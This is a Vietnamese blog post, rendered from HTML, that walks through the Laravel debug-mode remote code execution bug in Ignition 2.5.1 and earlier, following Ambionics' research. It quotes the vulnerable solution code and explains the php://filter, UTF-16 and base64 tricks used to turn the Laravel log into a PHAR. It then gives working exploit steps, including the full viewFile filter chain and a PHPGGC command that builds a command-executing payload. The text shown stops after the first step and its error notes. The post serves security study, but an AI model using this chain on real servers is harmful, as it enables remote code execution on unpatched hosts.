aria-label="Laravel &amp;lt;= v8.4.2 debug mode: Remote code execution">Laravel &lt;= v8.4.2 debug mode: Remote code execution</a></li><li><a href=#ignition--251 aria-label="Ignition &amp;lt;= 2.5.1">Ignition &lt;= 2.5.1</a></li><li><a href=#log-file-to-phar aria-label="Log file to PHAR">Log file to PHAR</a><ul><li><a href=#php-wrappers-changing-a-file aria-label="PHP wrappers: changing a file">PHP wrappers: changing a file</a></li><li><a href=#write-the-log-file aria-label="Write the log file">Write the log file</a></li><li><a href=#convert-file aria-label="Convert file">Convert file</a></li><li><a href=#complete-exploit-steps aria-label="Complete exploit steps">Complete exploit steps</a><ul><ul><li><a href=#b%c6%b0%e1%bb%9bc-1-t%e1%ba%a1o-phpggc-payload-v%c3%a0-encode-n%c3%b3-theo-format-tr%c3%aan aria-label="Bước 1: Tạo PHPGGC payload và encode nó theo format trên:">Bước 1: Tạo PHPGGC payload và encode nó theo format trên:</a></li><li><a href=#b%c6%b0%e1%bb%9bc-2-xo%c3%a1-log aria-label="Bước 2: Xoá log">Bước 2: Xoá log</a></li><li><a href=#b%c6%b0%e1%bb%9bc-3-t%e1%ba%a1o-log-ch%e1%bb%a9a-payload aria-label="Bước 3: Tạo log chứa payload">Bước 3: Tạo log chứa payload</a></li><li><a href=#b%c6%b0%e1%bb%9bc-4-convert-file-log-sang-file-phar aria-label="Bước 4: Convert file log sang file PHAR">Bước 4: Convert file log sang file PHAR</a></li><li><a href=#b%c6%b0%e1%bb%9bc-5-ch%e1%ba%a1y-phar-deserialization aria-label="Bước 5: Chạy PHAR deserialization">Bước 5: Chạy PHAR deserialization</a></li></ul></ul></li></ul></li><li><a href=#exploit-poc aria-label="Exploit PoC">Exploit PoC</a></li><li><a href=#tham-kh%e1%ba%a3o aria-label="Tham khảo">Tham khảo</a></li></ul></div></details></div><div class=post-content><h1 id=tản-mạn>Tản mạn<a hidden class=anchor aria-hidden=true href=#tản-mạn>#</a></h1><p>&ldquo;Hằng năm cứ vào cuối đông, lá ngoài đường rụng nhiều và trên không có những đám mây bàng bạc, lòng tôi lại nao nức những kỷ niệm hoang mang.</p><p>Tôi không thể nào quên được những cảm giác trong sáng ấy nảy nở trong lòng tôi như mấy cành hoa tươi mỉm cười giữa bầu trời quang đãng.</p><p>Những ý tưởng ấy tôi chưa lần nào ghi lên giấy, vì hồi ấy tôi không biết ghi và ngày nay tôi không nhớ hết. Nhưng mỗi lần thấy các bạn viết những nghiên cứu của bản thân mình để chia sẻ cho mọi người, lòng tôi lại tưng bừng rộn rã.</p><p>Buổi sáng mai hôm ấy, một buổi mai đầy sương thu và gió lạnh. Tôi âu yếm ngồi lên chiếc Sirius quen thuộc rồi đi trên những con phố Hà Nội đầy tấp nập. Con đường này tôi đã quen đi lại lắm lần, nhưng lần này tự nhiên tôi thấy lạ. Cảnh vật chung quanh tôi đều thay đổi, vì chính lòng tôi đang có sự thay đổi lớn: Hôm nay tôi đi làm&rdquo;</p><p>Giữa cái thời tiết rét buốt đến độ mỗi sáng người ta sẽ đánh vật với lý trí của bản thân: dậy chuẩn bị đi làm hay xin Inlate 2 tiếng để đi ngủ thêm. Còn tôi thì vẫn như một thói quen, 6h sáng chiếc Google Home Mini đánh thức tôi dậy bằng bản nhạc &ldquo;Giá như&rdquo; của Chillies, một bài mà tôi rất thích trong thời gian gần đây. Trước khi rời khỏi chiếc chăn ấm của mình, đầu tiên tôi sẽ tìm cái điện thoại của mình và xem ngày hôm nay thế giới đã thay đổi được những gì, lướt 1 dạo thấy một bài Writeup vừa mới được public không lâu ở <a href=https://www.ambionics.io/blog/laravel-debug-rce>Laravel &lt;= v8.4.2 debug mode: Remote code execution</a>. Tôi dần dần chú ý vào tiêu đề của bài viết và đọc một chút nội dung trong này. Chà! một bài viết thật công phu, sáng nay tôi lại có thứ mới để nghiên cứu rồi. Vậy là tôi chuẩn bị lên đường đi làm với một cảm xúc thật tươi vui. Hôm nay tôi đi làm.</p><blockquote><p>Tản mạn vậy đủ rồi, bài viết này là bài viết về kỹ thuật chứ không phải bài văn xuôi đâu :D</p></blockquote><blockquote><p>Tất cả nội dung trong bài viết này được tham khảo trong bài viết <a href=https://www.ambionics.io/blog/laravel-debug-rce>https://www.ambionics.io/blog/laravel-debug-rce</a></p></blockquote><h1 id=laravel--v842-debug-mode-remote-code-execution>Laravel &lt;= v8.4.2 debug mode: Remote code execution<a hidden class=anchor aria-hidden=true href=#laravel--v842-debug-mode-remote-code-execution>#</a></h1><p>Làm cái video cho nó tín cái đã
{@embed: <a href=https://vimeo.com/500275499%7D>https://vimeo.com/500275499}</a></p><p>Trong quá trình đi test các dự án của khách hàng, mình thường xuyên thấy cái mode debug này được bật, ngày xưa còn lấy được cả APP_KEYS rồi RCE luôn server test, được ngay cái báo cáo xịn, tuy nhiên đấy là câu chuyện của Laravel 5 trở xuống thôi, còn bây giờ từ Laravel 6 trở lên thì
nó sử dụng <a href=https://github.com/facade/ignition>Ignition</a> để hiển thị debug. Ignition được bật tự động trong Laravel 6 trở lên.</p><p><img loading=lazy src=https://images.viblo.asia/0e04523b-a7cd-4c2d-a8f2-68ece609b5c6.png alt></p><h1 id=ignition--251>Ignition &lt;= 2.5.1<a hidden class=anchor aria-hidden=true href=#ignition--251>#</a></h1><p>Ở đây mình có 1 file <code>hello.blade.php</code> có nội dung là <code>{{ $username }}</code>, nếu sử dụng một biến mà không được define thì nó sẽ trả về một lỗi như hình bên trên. Khi ta click vào <code>Make variable Optional</code> thì nó sẽ tự động replace <code>{{ $username }}</code> thành <code>{{ $username ? '' }}</code>. Kiểm tra log thì ta thấy được request như sau:</p><p><img loading=lazy src=https://images.viblo.asia/fa3a378d-8120-4be0-9b05-f9cd84211639.png alt></p><p>Những researcher ở Ambionics đã nghĩ đến các sử dụng chính tính năng này để có thể thay đổi nội dung của file bất kỳ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-./vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php data-lang=./vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php><span class=line><span class=cl>class MakeViewVariableOptionalSolution implements RunnableSolution
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    ...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    public function run(array $parameters = [])
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        $output = $this-&gt;makeOptional($parameters);
</span></span><span class=line><span class=cl>        if ($output !== false) {
</span></span><span class=line><span class=cl>            file_put_contents($parameters[&#39;viewFile&#39;], $output);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    public function makeOptional(array $parameters = [])
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]); // [1]
</span></span><span class=line><span class=cl>        $newContents = str_replace(&#39;$&#39;.$parameters[&#39;variableName&#39;], &#39;$&#39;.$parameters[&#39;variableName&#39;].&#34; ?? &#39;&#39;&#34;, $originalContents);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2]
</span></span><span class=line><span class=cl>        $newTokens = token_get_all(Blade::compileString($newContents));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        $expectedTokens = $this-&gt;generateExpectedTokens($originalTokens, $parameters[&#39;variableName&#39;]);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        if ($expectedTokens !== $newTokens) { // [3]
</span></span><span class=line><span class=cl>            return false;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        return $newContents;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    protected function generateExpectedTokens(array $originalTokens, string $variableName): array
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        $expectedTokens = [];
</span></span><span class=line><span class=cl>        foreach ($originalTokens as $token) {
</span></span><span class=line><span class=cl>            $expectedTokens[] = $token;
</span></span><span class=line><span class=cl>            if ($token[0] === T_VARIABLE <span class=err>&amp;&amp;</span> $token[1] === &#39;$&#39;.$variableName) {
</span></span><span class=line><span class=cl>                $expectedTokens[] = [T_WHITESPACE, &#39; &#39;, $token[2]];
</span></span><span class=line><span class=cl>                $expectedTokens[] = [T_COALESCE, &#39;??&#39;, $token[2]];
</span></span><span class=line><span class=cl>                $expectedTokens[] = [T_WHITESPACE, &#39; &#39;, $token[2]];
</span></span><span class=line><span class=cl>                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, &#34;&#39;&#39;&#34;, $token[2]];
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        return $expectedTokens;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    ...
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Sau khi đọc được file path truyền vào [1] và thay thế <code>$variableName</code> thành <code>variableName ?? "</code> cả file ban đầu và file mới đều sẽ được mã hóa [2] và file ban đầu được thay thế bằng nội dung mới của nó. Nếu không, <code>makeOptional</code> sẽ trả về <code>false</code> [3] và file mới sẽ không được ghi. Do đó, không thể làm được gì nhiều khi sử dụng <code>variableName</code>.</p><p>Input variable duy nhất còn lại là <code>viewFile</code>, từ đoạn code trên có thể viết lại đoạn code rút gọn như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$contents</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$parameters</span><span class=p>[</span><span class=s1>&#39;viewFile&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$parameters</span><span class=p>[</span><span class=s1>&#39;viewFile&#39;</span><span class=p>],</span> <span class=nv>$contents</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Đoạn code này lấy nội dung lấy từ <code>viewFile</code> rồi chèn trở lại <code>viewFile</code>. Chẳng để làm gì cả đúng không :upside_down_face:</p><h1 id=log-file-to-phar>Log file to PHAR<a hidden class=anchor aria-hidden=true href=#log-file-to-phar>#</a></h1><h2 id=php-wrappers-changing-a-file>PHP wrappers: changing a file<a hidden class=anchor aria-hidden=true href=#php-wrappers-changing-a-file>#</a></h2><p>Có một kỹ thuật được trình bày bởi Orange Tsai <a href=http://blog.orange.tw/2018/10/>http://blog.orange.tw/2018/10/</a>. Nó sử dụng <code>php:filter</code> để thay đổi nội dung của file trước khi được trả về. Và bây giờ có thể sử dụng kỹ thuật này để chuyển nội dung của file bằng cách sử dụng cách sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=nb>test</span> <span class=p>|</span> base64 <span class=p>|</span> base64 &gt; /path/to/file.txt
</span></span><span class=line><span class=cl>$ cat /path/to/file.txt
</span></span><span class=line><span class=cl>ZEdWemRBbz0K
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=s1>&#39;php://filter/convert.base64-decode/resource=/path/to/file.txt&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1># Reads /path/to/file.txt, base64-decodes it, returns the result</span>
</span></span><span class=line><span class=cl><span class=nv>$contents</span> <span class=o>=</span> file_get_contents<span class=o>(</span><span class=nv>$f</span><span class=o>)</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=c1># Base64-decodes $contents, then writes the result to /path/to/file.txt</span>
</span></span><span class=line><span class=cl>file_put_contents<span class=o>(</span><span class=nv>$f</span>, <span class=nv>$contents</span><span class=o>)</span><span class=p>;</span> 
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat /path/to/file.txt
</span></span><span class=line><span class=cl><span class=nb>test</span>
</span></span></code></pre></td></tr></table></div></div><p>Vậy có thể sửa đổi nội dung file theo cách này, tuy nhiên chúng ta cần phải sửa đổi nội dung file chỉ được với 1 dòng duy nhất</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># To base64-decode once, use:</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=s1>&#39;php://filter/read=convert.base64-decode/resource=/path/to/file.txt&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1># OR</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=s1>&#39;php://filter/write=convert.base64-decode/resource=/path/to/file.txt&#39;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>Thậm chí file chứa những charset không nằm trong base64 (badchars) thì PHP bỏ qua những badchars này và vẫn decode như bình thường</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;:;.!!!!!ZEdWemRBbz0K:;.!!!!!&#39;</span> &gt; /path/to/file.txt
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$f</span> <span class=o>=</span> <span class=s1>&#39;php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$contents</span> <span class=o>=</span> file_get_contents<span class=o>(</span><span class=nv>$f</span><span class=o>)</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>file_put_contents<span class=o>(</span><span class=nv>$f</span>, <span class=nv>$contents</span><span class=o>)</span><span class=p>;</span> 
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat /path/to/file.txt
</span></span><span class=line><span class=cl><span class=nb>test</span>
</span></span></code></pre></td></tr></table></div></div><p>Vậy giờ chúng ta cần phải tìm được 1 file mà mình có thể control được thông tin ghi vào file, ở đây chính là file log mặc định của Laravel</p><h2 id=write-the-log-file>Write the log file<a hidden class=anchor aria-hidden=true href=#write-the-log-file>#</a></h2><p>Theo mặc định, file log của Laravel chứa mọi lỗi PHP và stack trace, được lưu trong <code>storage/log/laravel.log</code>. Cố gắng tạo ra lỗi để được ghi lỗi vào file log =)).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {&#34;exception&#34;:&#34;[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
</span></span><span class=line><span class=cl>[stacktrace]
</span></span><span class=line><span class=cl>#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError()
</span></span><span class=line><span class=cl>#1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents()
</span></span><span class=line><span class=cl>#2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution-&gt;makeOptional()
</span></span><span class=line><span class=cl>#3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution-&gt;run()
</span></span><span class=line><span class=cl>#4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController-&gt;__invoke()
</span></span><span class=line><span class=cl>[...]
</span></span><span class=line><span class=cl>#32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\Pipeline\\Pipeline-&gt;Illuminate\\Pipeline\\{closure}()
</span></span><span class=line><span class=cl>#33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\Pipeline\\Pipeline-&gt;then()
</span></span><span class=line><span class=cl>#34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\Foundation\\Http\\Kernel-&gt;sendRequestThroughRouter()
</span></span><span class=line><span class=cl>#35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\Foundation\\Http\\Kernel-&gt;handle()
</span></span><span class=line><span class=cl>#36 /work/pentest/laravel/laravel/server.php(21): require_once(&#39;/work/pentest/l...&#39;)
</span></span><span class=line><span class=cl>#37 {main}
</span></span><span class=line><span class=cl>&#34;}
</span></span></code></pre></td></tr></table></div></div><p>Vậy là chúng ta có thể có thể đưa nội dung tùy ý vào một file. Sau đó chuyển đổi file log thành file PHAR và sử dụng phar để RCE :smiley:</p><p>Tuy rằng nghe có vẻ dễ như vậy nhưng thật ra có rất nhiều vấn đề</p><h2 id=convert-file>Convert file<a hidden class=anchor aria-hidden=true href=#convert-file>#</a></h2><p>Như ở trên, ta biết rằng PHP sẽ bỏ qua bất kỳ badchar nào khi sử dụng base64-decoding. Điều này đúng, ngoại trừ một character: <code>=</code>. Nếu bạn sử dụng <code>base64-decode filter</code> một chuỗi có chứa <code>=</code> ở giữa, PHP sẽ tạo ra lỗi và không trả về kết quả nào.</p><p>Chúng ta có thể khắc phục được điều này nếu chúng ta có thể control được nội dung file đó. Tuy nhiên, payload chúng ta đưa vào file log chỉ là một phần rất nhỏ của nó. Ở mỗi đoạn log sẽ có 1 đoạn prefix (timestamp) -> Payload -> suffix (stack strace). Hơn nữa, payload lại xuất hiện2 lần trong file log như ví dụ dưới đây:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[2021-01-13 11:09:46] local.ERROR: file_get_contents(PAYLOAD): failed to open stream: No such file or directory {&#34;exception&#34;:&#34;
</span></span><span class=line><span class=cl>[object] (ErrorException(code: 0): file_get_contents(PAYLOAD): failed to open stream: No such file or directory at /var/www/html/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
</span></span><span class=line><span class=cl>[stacktrace]
</span></span><span class=line><span class=cl>#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions-&gt;handleError(2, &#39;file_get_conten...&#39;, &#39;/var/www/html/v...&#39;, 75, Array)
</span></span></code></pre></td></tr></table></div></div><p>Sau nhiều lần thử nghiệm, những researcher của Ambionics đã tìm ra cách để loại bỏ các phần dư thừa để lấy được Payload. Ví dụ với trường hợp như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[prefix]PAYLOAD[midfix]PAYLOAD[suffix]
</span></span></code></pre></td></tr></table></div></div><p>Cách mà họ sử dụng là sử dụng chuyển đổi bảng mã UTF-16 sang UTF-8. Vì cứ 2 byte thì sẽ được 1 char theo mã UTF-16 nên convert sang UTF-8 thì <code>P\0</code> -> <code>P</code>. Còn các cặp 2 byte ở prefix, midfix, suffix sẽ bị convert thành junk char giống như dưới đây (và phần junk này sau đó sẽ bị loại bỏ ở bước base64 decoding):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> -ne <span class=s1>&#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]&#39;</span> &gt; /tmp/test.txt
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>卛浯⁥牰晥硩崠PAYLOAD浛摩楦嵸PAYLOAD卛浯⁥畳晦硩崠</span>
</span></span></code></pre></td></tr></table></div></div><p>Ok, giờ ta đã giữ được nội dung của payload, bước tiếp theo là loại bỏ những ký tự nào không phải là ASCII là xong. Tuy nhiên có một vấn đề là nội dung Payload lại hiển thị 2 lần, chúng ta cần phải loại bỏ 1 cái đi mới đúng cấu trúc của file PHAR.
Để giải quyết vấn đề này ta lại nhớ lại là UTF-16 làm việc với hai byte, nên chỉ cần thêm 1 byte vào phần giữa Payload 1 và Payload 2 (như dưới đây là thêm <code>X</code> vào sau <code>D\0</code>) thì byte aligment của Payload thứ 2 sẽ bị lệch, dẫn đến Payload 2 bị convert thành junk chars:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> -ne <span class=s1>&#39;[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]&#39;</span> &gt; /tmp/test.txt
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>&gt;</span> <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>卛浯⁥牰晥硩崠PAYLOAD存業晤硩偝䄀夀䰀伀䄀䐀堀卛浯⁥畳晦硩崠</span>
</span></span></code></pre></td></tr></table></div></div><p>Vậy, kết luận chúng ta sẽ có get chain cuối cùng là:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>viewFile</span><span class=o>:</span> <span class=nx>php</span><span class=o>://</span><span class=nx>filter</span><span class=o>/</span><span class=nx>write</span><span class=o>=</span><span class=nx>convert</span><span class=o>.</span><span class=nx>quoted</span><span class=o>-</span><span class=nx>printable</span><span class=o>-</span><span class=nx>decode</span><span class=o>|</span><span class=nx>convert</span><span class=o>.</span><span class=nx>iconv</span><span class=o>.</span><span class=nx>utf</span><span class=o>-</span><span class=mi>16</span><span class=nx>le</span><span class=o>.</span><span class=nx>utf</span><span class=o>-</span><span class=mi>8</span><span class=o>|</span><span class=nx>convert</span><span class=o>.</span><span class=nx>base64</span><span class=o>-</span><span class=nx>decode</span><span class=o>/</span><span class=nx>resource</span><span class=o>=/</span><span class=nx>path</span><span class=o>/</span><span class=nx>to</span><span class=o>/</span><span class=nx>storage</span><span class=o>/</span><span class=nx>logs</span><span class=o>/</span><span class=nx>laravel</span><span class=o>.</span><span class=nx>log</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=complete-exploit-steps>Complete exploit steps<a hidden class=anchor aria-hidden=true href=#complete-exploit-steps>#</a></h2><h4 id=bước-1-tạo-phpggc-payload-và-encode-nó-theo-format-trên>Bước 1: Tạo PHPGGC payload và encode nó theo format trên:<a hidden class=anchor aria-hidden=true href=#bước-1-tạo-phpggc-payload-và-encode-nó-theo-format-trên>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>php -d<span class=s1>&#39;phar.readonly=0&#39;</span> ./phpggc monolog/rce1 system id --phar phar -o php://output <span class=p>|</span> base64 -w0 <span class=p>|</span> sed -E <span class=s1>&#39;s/./\0=00/g&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Chú ý, chỉnh sửa một chút ở phía đầu ra Payload, thay thế dấu <code>==</code> thành <code>=3D</code>. Mình cũng k hiểu vì sao Ambionics chạy được với 2 dấu <code>=</code> ở cuối payload, mình chạy toàn bị lỗi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Warning: file_get_contents(): stream filter (convert.quoted-printable-decode): invalid byte sequence in php shell code on line 1
</span></span></code></pre></td></tr></table></div></div><p>Sau một hồi anh em debug thì phát hiện ra phải sửa 1 dấu <code>=</code> thành <code>3D</code> thì chạy ngon nghẻ, nếu thấy xuất hiện lỗi</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Warning: file_get_contents(): iconv stream filter (&#34;utf-16le&#34;=&gt;&#34;utf-8&#34;): invalid multibyte sequence in php shell code on line 1
